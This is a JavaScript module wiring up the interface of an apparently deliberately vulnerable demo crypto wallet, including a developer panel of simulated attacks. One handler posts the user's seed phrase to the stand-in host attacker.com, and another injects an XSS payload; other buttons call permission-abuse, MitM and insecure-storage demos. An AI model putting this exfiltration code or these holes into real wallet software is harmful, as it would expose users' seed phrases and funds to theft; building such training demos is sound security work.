import { walletState, updateWalletState } from './walletState.js';
import { createWallet, importWallet, sendTransaction } from './walletOperations.js';
import { abusePermissions, simulateMitM, simulateXSS, simulateExfiltration, insecureStorage } from './vulnerabilities.js';
import { updateUI, toggleForm, updateDevStatus, toggleDevPanel } from './ui.js';

export function initEventHandlers() {

  document.getElementById('create-wallet-btn').addEventListener('click', () => {
    createWallet();
    updateUI();
  });

  document.getElementById('import-wallet-btn').addEventListener('click', () => {
    const seedPhrase = prompt('Enter your seed phrase:');
    if (seedPhrase) {
      importWallet(seedPhrase);
      updateUI();
    }
  });

  document.getElementById('transfer-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const to = document.getElementById('recipient').value;
    const amount = parseFloat(document.getElementById('amount').value);
    const memo = document.getElementById('memo').value;

    try {
      await sendTransaction(to, amount, memo);
      toggleForm('send-form');
      document.getElementById('transfer-form').reset();
      updateUI();
    } catch (error) {
      alert(error.message);
    }
  });

  document.getElementById('send-btn').addEventListener('click', () => {
    toggleForm('send-form', 'receive-form');
  });

  document.getElementById('receive-btn').addEventListener('click', () => {
    toggleForm('receive-form', 'send-form');
  });

  document.getElementById('swap-btn').addEventListener('click', () => {
    alert('Swap functionality coming soon!');
  });

  document.getElementById('copy-address').addEventListener('click', () => {
    navigator.clipboard.writeText(walletState.address);
    alert('Address copied to clipboard!');
  });

  document.getElementById('network-select').addEventListener('change', (e) => {
    updateWalletState({ network: e.target.value });
    updateUI();
  });


  document.getElementById('refresh-balance').addEventListener('click', () => {
    updateWalletState({
      balance: parseFloat((walletState.balance + Math.random() * 0.1).toFixed(4))
    });
    updateUI();
  });

  document.getElementById('toggle-dev').addEventListener('click', toggleDevPanel);

  document.getElementById('exfil-seed').addEventListener('click', () => {
    if (!walletState.seedPhrase) {
      alert('No wallet to exfiltrate!');
      return;
    }
    fetch('http://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify({ seed: walletState.seedPhrase })
    }).then(() => {
      updateDevStatus('Seed exfiltrated! (Simulated)');
    }).catch(() => {
      updateDevStatus('Exfiltration failed.');
    });
  });

  document.getElementById('show-seed').addEventListener('click', () => {
    if (!walletState.seedPhrase) {
      alert('No wallet to show!');
      return;
    }
    alert(`Your seed phrase: ${walletState.seedPhrase}\n\nWARNING: Never share your seed phrase with anyone!`);
  });

  const devContent = document.getElementById('dev-content');
  const vulnButtons = `
    <button id="demo-permissions" class="danger-btn">Demo Permissions Abuse</button>
    <button id="demo-mitm" class="danger-btn">Demo MitM Attack</button>
    <button id="demo-xss" class="danger-btn">Demo XSS</button>
    <button id="demo-exfil" class="danger-btn">Demo Exfiltration</button>
    <button id="demo-storage" class="danger-btn">Demo Insecure Storage</button>
  `;
  devContent.insertAdjacentHTML('beforeend', vulnButtons);

  document.getElementById('demo-permissions').addEventListener('click', abusePermissions);
  document.getElementById('demo-mitm').addEventListener('click', async () => {
    const prices = await simulateMitM();
    updateDevStatus(`MitM simulated! ETH price: $${prices.ETH}`);
  });
  document.getElementById('demo-xss').addEventListener('click', () => {
    simulateXSS('<img src=https://media.tenor.com/2nEy5Ee9d3EAAAAj/13th.gif onerror="alert(\'XSS Demo\')">');
    updateDevStatus('XSS demo executed!');
  });
  document.getElementById('demo-exfil').addEventListener('click', () => {
    simulateExfiltration({
      type: 'demo',
      timestamp: Date.now(),
      wallet: walletState.address
    });
    updateDevStatus('Exfiltration demo executed!');
  });
  document.getElementById('demo-storage').addEventListener('click', () => {
    insecureStorage(walletState);
    updateDevStatus('Data stored insecurely! Check localStorage.');
  });
} 